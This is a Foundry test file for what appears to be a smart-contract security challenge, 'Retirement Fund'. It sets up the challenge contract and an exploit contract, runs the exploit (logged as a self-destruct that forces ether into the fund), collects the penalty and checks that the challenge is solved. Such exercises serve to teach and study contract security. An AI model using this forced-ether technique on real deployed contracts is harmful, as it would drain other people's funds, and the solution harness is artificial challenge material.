// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RetirementFund.sol";
import {console2} from "forge-std/console2.sol";

contract RetirementFundTest is Test {
    RetirementFund public retirementFund;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        retirementFund = (new RetirementFund){value: 1 ether}(address(this));
        exploitContract = new ExploitContract(retirementFund);
    }

    function testIncrement() public {
        vm.deal(address(exploitContract), 1 ether);
        // Test your Exploit Contract below
        // Use the instance retirementFund and exploitContract

        // test contract is player / beneficiary

        exploitContract.exploit();
        console2.log("after self destruct");
        console2.log(address(retirementFund).balance);
        retirementFund.collectPenalty();
        // Put your solution here

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(retirementFund.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
